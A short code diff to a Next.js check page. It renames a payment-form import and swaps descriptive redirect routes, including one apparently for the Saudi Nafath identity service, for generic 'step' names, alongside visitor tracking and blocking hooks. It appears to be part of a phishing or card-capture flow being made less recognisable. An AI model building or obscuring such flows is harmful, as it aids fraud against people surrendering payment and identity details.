@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Check, X, Globe } from 'lucide-react'
 import { FullPageLoader } from "@/components/loader"
 import { StepIndicator } from "@/components/step-indicator"
-import _P1 from "@/components/pay-form"
+import _P1 from "@/components/form-a"
 import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -66,15 +66,15 @@ export default function CheckPage() {
 
           // Redirect based on currentStep
           if (step === "home") {
-            router.push("/main")
+            router.push("/step1")
           } else if (step === "phone") {
-            router.push("/phone-info")
+            router.push("/step5")
           } else if (step === "_t6") {
-            router.push("/nafad")
+            router.push("/step4")
           } else if (step === "_t2") {
-            router.push("/veri")
+            router.push("/step2")
           } else if (step === "_t3") {
-            router.push("/confi")
+            router.push("/step3")
           }
         }
       },
